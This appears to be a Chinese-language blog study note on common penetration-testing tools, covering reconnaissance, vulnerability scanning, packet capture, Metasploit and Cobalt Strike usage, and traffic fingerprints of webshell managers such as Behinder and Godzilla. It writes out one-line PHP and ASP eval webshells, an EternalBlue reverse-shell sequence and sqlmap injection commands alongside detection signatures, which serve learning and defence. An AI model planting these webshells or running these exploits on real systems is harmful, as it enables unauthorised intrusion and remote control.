---
title: '常用的渗透工具'
description: '记录常用的渗透工具'
pubDate: '2026-05-09T17:12:25+08:00'
draft: false
toc: true
tags: ['Security', 'Tool']
---
## 信息收集

### Nmap

网络扫描与资产探测工具。

端口状态：

1. open
2. closed
3. filtered
4. unfiltered
5. open|filtered

常用命令

```bash 
1. nmap 192.168.1.1 # 扫描常见的1000个端口
2. nmap -p- ip      # 全端口扫描
3. nmap -p 80,443,8080 # 指定端口
4. nmap -sV ip      # 服务识别：Apache，Nginx，Mysql
5. nmap -O ip       # 操作系统识别

6. nmap -sS ip      # SYN半连接扫描： 快、隐蔽
7. nmap -sU ip      # UDP扫描：DNS等  慢
8. nmap -sn ip/24   # 探测存活主机 不扫描端口
9. nmap -Pn ip      # 跳过主机存活检测，有些服务器禁ICMP，不回Ping 
										# 不使用-Pn 会认为不存在

10. nmap --script vlun ip #使用NSE进行漏扫
```

Nmap快的原因：并发 + 原始数据包

SYN扫描：快 隐蔽 不建立连接 ；TCP连接：明显 容易被日志记录

### Masscan

速度很快 专注端口发现（异步高速发包）

```bash
1. masscan ip -p 80,443
2. masscan ip/24 -p 80
3. --rate 1000 # 速度太快容易网络阻塞、被IDS发现
```

### WhatWeb

网站指纹识别工具，用于识别：Web框架、CMS、中间件、编程语言

```bash
whatweb http://example.com
# 输出
Apache php8 Booststrap ···

# 参数
whatweb -a 1（温和）		whatweb -a 3（激进）
```

### Dirsearch

web目录扫描工具

通过字典进行不断请求，用于发现后台目录、隐藏页面、备份文件

```bash
python dirsearch.py -u http://example.com
-w list.txt # 指定字典
-e php,jsp,txt # 指定后缀
```

### Subfinder

子域名收集

```bash
subfinder -d example.com
-o result.txt # 保存结果
-t 50 # 多线程

```

### Fofa 、 Shodan 资产收集平台

## 漏洞扫描

### Xray

```bash
xray webscan --listen ip:port # 被动监听
xray webscan --url http://example.com # 主动扫描
```

误报低 插件优秀 能联动burpsuite

### AWVS

自动化强 误报率偏多。直接输入目标网址

### Burp + Scanner

专业版自带漏洞扫描

抓包（proxy）--> 右键Scan --> fuzz / payload注入

### Sqlmap

```bash 
# Get注入
sqlmap -u "http://test.com?id=1"
# Post注入
sqlmap -u http://test.com/login --data="user=1&pass=1"

--dbs # 获取数据库
-D test --tables # 获取表
```

跑不出来的原因：

WAF、参数加密、二次注入

### Nessus

## 抓包工具

### Burp

Http/Https 代理抓包

设置代理：`ip:8080` --> 开启Intercept --> 拦截请求 修改参数 --> send to Repeater

Intruder中可以进行参数爆破 fuzz

### Charles

Web层。适合手机抓包，用于App请求分析 API调试

### Wireshark

网络层抓包工具

```bash
ip.addr == ip  # 指定ip
tcp.port == 80 # 指定端口
```

分析攻击流量：木马、C2通信； 排查网络问题：丢包、重传

重点：

1. 过滤器
2. 右键 Follow Tcp Stream：查看完整通信内容
3. 过滤dns：查看域名解析，DNS隧道

### tcpdump

Linux命令行抓包工具

```bash
tcpdump -i eth0 # 抓指定网卡
tcpdump port 80 # 抓指定端口
tcpdump -w test.pcap # 然后放到wireshark分析
```



## 漏洞利用

### Metasploit（MSF）

本质：Exploit + Payload + Session 管理

```bash
# 核心结构
1. exploit（漏洞利用）
	永恒之蓝,Apache,Tomcat
2. payload（载荷）
	漏洞成功后执行：反弹shell、添加用户
3. Meterpreter
	功能：文件上传下载；摄像头；键盘记录；shell；提权
```

```bash
# 使用流程
1. msfconsole # 启动
2. search smb # 搜索漏洞
3. use exploit/windows/smb/ms17_010_eternalblue # 使用模块
4. show options #查看参数
5. set RHOST ip # 设置目标
6. set payload windows/x64/meterpreter/reverse_tcp # 设置payload
7. set LHOST ip #设置监听IP
run
成功后得到 meterpreter > 
```

### Cobalt Strike

后渗透与C2控制。C2：Command and Control

```bash
# 核心组件
TeamServer # 控制端
Beacon     # 木马、后门
Listener   # 监听器
```

```bash
# 基础流程
1. ./teamserver 192.168.1.100 password # 启动TeamServer
2. 输入IP 密码 # 客户端链接
3. 创建Listener：HTTP Beacon
4. 生成Payload ：EXE DLL PowerShell
5. 目标上线：Beacon 回连
```

beacon有休眠 比msf更隐蔽

## WebShell管理

### 菜刀

payload的特征：

1. php:
2. `asp:<%eval request("caidao")%>`
3. `asp.net:<%@PageLanguage="Jscript"%><%eval(Request.Item["caidao"],"unsafe");%>`

数据包流量特征：

1. 请求包中：ua头为百度
2. 请求体中有eval，base64等特征字符
3. 请求体中传递的payload为base64编码，并且是固定的

### AntSword

`<?php eval($_POST['cmd']); ?>` 

payload的特征：

1. php中使用assert，eval执行
2. asp使用eval执行
3. jsp中使用的是Java类加载（ClassLoader），同时会带有base64编码解码等字符特征

数据包流量特征：请求体中一定有@in_set("display_errors","0");@set_time_limit(0)开头，后面存在base64等字符

### 冰蝎2.0

payload特征：

先base64加密，再经过AES对称加密全部代码，最后传输

1. Accept字段：`Accept: text/html,image/gif, image/jpeg, *; q=.2, */*; q=.2`
2. User agent字段：冰蝎内置了17种ua头，每次连接shell都会随机一个进行使用，如果发现历史流量中同一个IP访问URL的时候，命令了以下列表中的多个ua头，可以基本确定为冰蝎
3. 默认情况下，请求头和响应头里会有Connection。`Connection: Keep-Alive`
4. 密钥传递时URL参数，URI只有一个key-value型参数，Key是黑客给shell设置的密码，一般为10位以下字母和数字`?pass=[三位数字]`
5. 传递的密钥：加密所使用的密钥长度为16位随机字符串，小写+数字组成

### 冰蝎3.0

payload特征：

先base64加密，再经过AES对称加密全部代码，最后传输

AES加密的密钥为`webshell连接密码的MD5的前16位，默认连接密码是"rebeyond"(即密钥是md5('rebeyond')[0:16]=e45e329feb5d925b)`

Accept&Cache-Control

```
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Cache-Control: no-cache
Pragma: no-cache
User-Agent: java/1.8
```

Content-Type：该请求头是冰蝎3.0中写死的部分，除非反编译，不然很难修改

```
Content-Type: application/octet-stream
```

### 冰蝎4.0

第一阶段：密钥协商
1）攻击者通过 GET 或者 POST 方法，形如` http://127.0.0.1/shell.aspx?pass=645 `的请求服务器密钥；
2）服务器使用随机数 MD5 的高16位作为密钥，存储到会话的 $_SESSION 变量中，并返回密钥给攻击者。
第二阶段-加密传输
1）客户端把待执行命令作为输入，利用 AES 算法或 XOR 运算进行加密，并发送至服务端；
2）服务端接受密文后进行 AES 或 XOR 运算解密，执行相应的命令；
3）执行结果通过AES加密后返回给攻击者。

1. Accept字段：`Accept: application/json, text/javascript, */*; q=0.01`
2. Content-Type：
   1. PHP站点：Application/x-www-form-urlencoded
   2. ASP站点：Application/octet-stream
3. 流量特征连接密码：默认时，所有冰蝎4.* webshell都有“e45e329feb5d925b” 一串密钥。该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond

### Godzilla

1. cookie：在Cookie中有一个很明显的特征：最后有一个分号

2. 响应体：从代码中可以看到会把一个32位的md5字符串按照一半拆分，分别放在base64编码的数据的前后两部分

整个响应包的结构体征为：**md5前十六位+base64+md5后十六位**

`72a9c691ccdaab98fL1tMGI4YTljO/5+/PlQm9MGV7lTjFUKUdfQMDL/j64wJ2UwYg==b4c4e1f6ddd2a488`

3. 连接特征

   1. 请求1：发送一段固定代码（payload），返回内容为空

   1. 请求2：发送一段固定代码（test），返回内容为固定字符串，如下：`72a9c691ccdaab98fL1tMGI4YTljO/79NDQm7r9PZzBiOA==b4c4e1f6ddd2a488`，解密后即为**ok**。如果连接失败返回内容为空，且不发起请求3

   1. 请求3：发送一段固定代码（getBacisInfo），返回内容为固定字符串（对应服务器信息）

## 内网渗透
